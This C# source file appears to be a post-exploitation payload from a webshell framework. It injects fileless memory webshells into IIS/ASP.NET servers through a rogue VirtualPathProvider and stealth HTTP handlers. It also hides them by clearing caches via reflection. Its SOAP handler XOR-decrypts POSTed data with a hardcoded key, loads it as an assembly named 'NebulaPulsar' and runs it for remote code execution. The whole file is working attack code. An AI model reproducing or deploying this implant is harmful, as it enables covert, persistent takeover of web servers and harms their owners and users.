using System;
using System.IO;
using System.Web;
using System.Web.Hosting;
using System.Reflection;
using System.Collections;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Text;

public class payload
{
    public payload() { }

    public string Execute(object param)
    {
        if (!(param is Dictionary<string, object> mapParam))
        {
            return "ERROR: Invalid parameter type. Expected Dictionary.";
        }
        
        if (!mapParam.TryGetValue("json", out var jsonValue) || string.IsNullOrEmpty(jsonValue?.ToString()))
        {
            return "ERROR: JSON data is empty.";
        }

        string szJson = jsonValue.ToString();
        
        string shellType = fnGetJsonValue(szJson, "shellType");
        string szUrlPattern = fnGetJsonValue(szJson, "urlPattern"); 
        string szClassName = fnGetJsonValue(szJson, "className");
        string szWebShellBase64 = fnGetJsonValue(szJson, "shellClassHex");

        HttpContext currentContext = HttpContext.Current;
        if (currentContext == null)
        {
            return "ERROR: Target application is not running inside an active IIS HttpContext.";
        }

        try
        {
            if (shellType.Equals("iis_virtualfile", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrEmpty(szUrlPattern))
                    szUrlPattern = "/Index.aspx";
                if (!szUrlPattern.StartsWith("/"))
                    szUrlPattern = "/" + szUrlPattern;

                MyPathProvider provider = new MyPathProvider(szUrlPattern, szWebShellBase64);
                HostingEnvironment.RegisterVirtualPathProvider(provider);

                fnGlobalClearCache();
                return $"[+] SUCCESS: IIS VirtualPathProvider MemoryShell injected at [{szUrlPattern}]!";
            }
            else if (shellType.Equals("iis_handler", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrEmpty(szUrlPattern))
                    szUrlPattern = "/WebResource.ashx";
                if (!szUrlPattern.StartsWith("/"))
                    szUrlPattern = "/" + szUrlPattern;

                byte[] rawHandlerCodeBytes = Convert.FromBase64String(szWebShellBase64);
                
                MyStealthHandler handlerInstance = new MyStealthHandler(rawHandlerCodeBytes);
                
                lock (currentContext.Application)
                {
                    currentContext.Application["HANDLER_GATE_" + szUrlPattern.ToLower()] = handlerInstance;
                }

                MyPathProvider shadowProvider = new MyPathProvider(szUrlPattern, szWebShellBase64);
                HostingEnvironment.RegisterVirtualPathProvider(shadowProvider);
                fnGlobalClearCache();

                return $"[+] SUCCESS: IIS HttpHandler directly bound with WebShell payload at [{szUrlPattern}]!";
            }
            else if (shellType.Equals("wcf_soap", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrEmpty(szUrlPattern))
                    szUrlPattern = "/PulsarService.asmx";
                if (!szUrlPattern.StartsWith("/"))
                    szUrlPattern = "/" + szUrlPattern;

                byte[] rawSoapCodeBytes = Convert.FromBase64String(szWebShellBase64);
                MyStealthSoapHandler soapHandlerInstance = new MyStealthSoapHandler(rawSoapCodeBytes);
                
                lock (currentContext.Application)
                {
                    currentContext.Application["HANDLER_GATE_" + szUrlPattern.ToLower()] = soapHandlerInstance;
                }

                MyPathProvider shadowSoapProvider = new MyPathProvider(szUrlPattern, szWebShellBase64);
                HostingEnvironment.RegisterVirtualPathProvider(shadowSoapProvider);
                fnGlobalClearCache();

                return $"[+] SUCCESS: WCF/SOAP Dynamic Endpoint successfully allocated at [{szUrlPattern}]!";
            }
        }
        catch (Exception ex)
        {
            return "[-] INJECTION_CRITICAL_FAULT: " + ex.Message;
        }

        return "ERROR: Unknown .NET shellType strategy [" + shellType + "].";
    }

    private void fnGlobalClearCache()
    {
        try
        {
            Type vppRegType = typeof(HostingEnvironment).Assembly.GetType("System.Web.Hosting.VirtualPathProviderRegistration");
            if (vppRegType != null)
            {
                MethodInfo clearCache = vppRegType.GetMethod("ClearCache", BindingFlags.Static | BindingFlags.NonPublic);
                if (clearCache != null) clearCache.Invoke(null, null);
            }
        }
        catch { }
    }

    public class MyPathProvider : System.Web.Hosting.VirtualPathProvider
    {
        private string _virtualDir;
        private string _sourceBase64;

        public MyPathProvider(string virtualDir, string sourceBase64) : base()
        {
            _virtualDir = virtualDir;
            _sourceBase64 = sourceBase64;
        }

        private bool IsPathVirtual(string virtualPath)
        {
            try
            {
                string checkPath = System.Web.VirtualPathUtility.ToAppRelative(virtualPath);
                return checkPath.ToLower().Contains(_virtualDir.ToLower());
            }
            catch
            {
                return virtualPath.ToLower().Contains(_virtualDir.ToLower());
            }
        }

        public override bool FileExists(string virtualPath)
        {
            if (IsPathVirtual(virtualPath)) return true;
            return Previous.FileExists(virtualPath);
        }

        public override System.Web.Hosting.VirtualFile GetFile(string virtualPath)
        {
            if (IsPathVirtual(virtualPath))
                return new MyVirtualFile(virtualPath, _sourceBase64);
                
            return Previous.GetFile(virtualPath);
        }

        public override object InitializeLifetimeService()
        {
            return null;
        }
    }

    public class MyVirtualFile : System.Web.Hosting.VirtualFile
    {
        private string _b64Data;
        public MyVirtualFile(string virtualPath, string b64Data) : base(virtualPath) 
        {
            _b64Data = b64Data;
        }

        public override System.IO.Stream Open()
        {
            byte[] rawWebShellBytes = Convert.FromBase64String(_b64Data);
            return new System.IO.MemoryStream(rawWebShellBytes);
        }
    }

    public class MyStealthHandler : IHttpHandler, System.Web.SessionState.IRequiresSessionState
    {
        private byte[] _ashxRawBytes;
        public bool IsReusable { get { return true; } }

        public MyStealthHandler() { }
        public MyStealthHandler(byte[] ashxRawBytes)
        {
            _ashxRawBytes = ashxRawBytes;
        }

        public void ProcessRequest(HttpContext ctx)
        {
            try
            {
                if (!ctx.Request.HttpMethod.Equals("POST", StringComparison.OrdinalIgnoreCase))
                {
                    ctx.Response.StatusCode = 404;
                    return;
                }

                if (_ashxRawBytes == null || _ashxRawBytes.Length == 0)
                {
                    ctx.Response.StatusCode = 404;
                    return;
                }

                ctx.Response.ContentType = "text/html";
                ctx.Response.OutputStream.Write(_ashxRawBytes, 0, _ashxRawBytes.Length);
                ctx.Response.Flush();
            }
            catch (Exception ex)
            {
                ctx.Response.Write("HANDLER_EXEC_FAULT: " + ex.Message);
            }
        }
    }

    public class MyStealthSoapHandler : IHttpHandler, System.Web.SessionState.IRequiresSessionState
    {
        private byte[] _soapRawBytes;
        public bool IsReusable { get { return true; } }

        public MyStealthSoapHandler() { }
        public MyStealthSoapHandler(byte[] soapRawBytes)
        {
            _soapRawBytes = soapRawBytes;
        }

        public void ProcessRequest(HttpContext ctx)
        {
            if (ctx.Request.HttpMethod.Equals("POST", StringComparison.OrdinalIgnoreCase))
            {
                try
                {
                    int totalBytes = ctx.Request.TotalBytes;
                    if (totalBytes <= 4) return;
                    byte[] rawData = ctx.Request.BinaryRead(totalBytes);

                    if (ctx.Session["k"] == null) ctx.Session["k"] = "e376d904f308ca98";
                    object loader = ctx.Session["nebulapulsar"];

                    if (loader == null)
                    {
                        byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes((string)ctx.Session["k"]);
                        for (int i = 0; i < rawData.Length; i++)
                            rawData[i] = (byte)(rawData[i] ^ keyBytes[(i + 1) & 15]);

                        Assembly asm = Assembly.Load(rawData);
                        loader = Activator.CreateInstance(asm.GetType("NebulaPulsar"));
                        ctx.Session["nebulapulsar"] = loader;
                        ctx.Response.Write("LOADER_INIT_SUCCESS");
                    }
                    else
                    {
                        ctx.Items["rawPostData"] = rawData;
                        loader.GetType().GetMethod("Equals", new Type[] { typeof(object) }).Invoke(loader, new object[] { ctx });
                    }
                }
                catch (Exception ex)
                {
                    ctx.Response.Write("SOAP_DYNAMIC_EXEC_FAULT: " + ex.Message);
                }
            }
        }
    }

    private string fnGetJsonValue(string json, string key)
    {
        Match match = Regex.Match(json, $"\"{key}\"\\s*:\\s*\"(.*?)\"");
        if (match.Success) return match.Groups[1].Value;
        match = Regex.Match(json, $"\"{key}\"\\s*:\\s*([^,\\}}\\]]+)");
        if (match.Success) return match.Groups[1].Value.Trim().Replace("\"", "");
        return "";
    }
}